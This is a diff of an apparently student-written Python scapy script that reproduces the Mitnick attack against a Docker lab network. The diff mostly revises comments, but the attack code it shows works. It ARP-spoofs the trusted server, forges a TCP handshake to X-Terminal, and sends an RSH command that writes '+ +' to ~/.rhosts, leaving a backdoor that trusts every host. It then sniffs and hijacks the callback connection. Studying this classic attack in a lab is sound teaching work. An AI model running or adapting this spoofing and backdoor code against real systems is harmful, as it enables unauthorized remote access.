@@ -1,7 +1,7 @@
+# Author: Gabriel de Oliveira Pontarolo, GRR20203895
 
 import scapy.all as scapy 
 from os import system
-from time import sleep
 from random import randint
 
 # Static IPs from docker compose
@@ -27,11 +27,12 @@ RSH_COMMAND = "echo '+ +' > ~/.rhosts"
 # RSH packet structure: stderr port (opitional) | client username | server username | command
 RSH_PACKET = f"{RSH_CONN_PORT}\0root\0root\0{RSH_COMMAND}\0"
 
+# Flag to open the shell at the end of the attack
 completed = False
 
 def arp_request(target_ip, sender_ip): 
     """
-    Send an ARP request packet to the target machine from the sender machine IP.
+    Send an ARP request packet to the target machine as the sender machine IP.
 
     Parameters:
         target_ip (str): The IP address of the target machine.
@@ -57,7 +58,7 @@ def arp_reply(target_ip, sender_ip, sender_mac=None):
 
 if __name__ == "__main__":
     try:
-        print("Starting MITM attack...")
+        print("Starting Mitnick attack...")
         print("     Using interface:", INTERFACE)
         print("     Attacker IP:", ATTACKER_IP)
         print("     X-Terminal IP:", X_TERM_IP)
@@ -82,7 +83,7 @@ if __name__ == "__main__":
         arp_reply(TRUSTED_SERVER_IP, X_TERM_IP, ATTACKER_MAC)
 
 
-        # ---------- Start a TCP connection with X-Terminal as the trusted server ----------
+        # ---------- Start a TCP connection with X-Terminal, pretending to be the trusted server ----------
         print("Starting three-way handshake...")
 
         # Create SYN packet to X-Terminal to start the connection with random sequence number
@@ -98,17 +99,20 @@ if __name__ == "__main__":
         scapy.send(ack, verbose=False)
 
 
-        # ---------- Send RSH packet to X-Terminal to execute a command ----------
+        # ---------- Run the RSH on X-Terminal as the trusted server to create the backdoor ----------
 
-        # Send RSH packet to X-Terminal as the trusted server with command
+        # Send RSH packet to X-Terminal as the trusted server with the 'echo + +' command
         print("Sending RSH packet...")
         rsh = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERM_IP)/scapy.TCP(flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1, sport=TRUSTED_SERVER_PORT, dport=X_TERM_PORT)/RSH_PACKET
         scapy.send(rsh, verbose=False)
         
         # X-Terminal will send a new TCP connection request to the trusted server
+        # We need to complete the three-way handshake for it to run the command from RSH
         print("Waiting for new TCP connection request...")
-        syn_filter = f"tcp and dst host {TRUSTED_SERVER_IP} and dst port {RSH_CONN_PORT}"
-        cap_packets = scapy.sniff(iface=INTERFACE, filter=syn_filter, count=2, timeout=5)
+
+        # Sniff the SYN packet from X-Terminal to the trusted server
+        syn_filter = f"tcp and dst host {TRUSTED_SERVER_IP} and dst port {RSH_CONN_PORT}" 
+        cap_packets = scapy.sniff(iface=INTERFACE, filter=syn_filter, count=2, timeout=5) 
         syn = [packet for packet in cap_packets if packet[scapy.TCP].flags=='S'][0]
 
         # Send SYN-ACK packet to X-Terminal with the new sequence and ack numbers
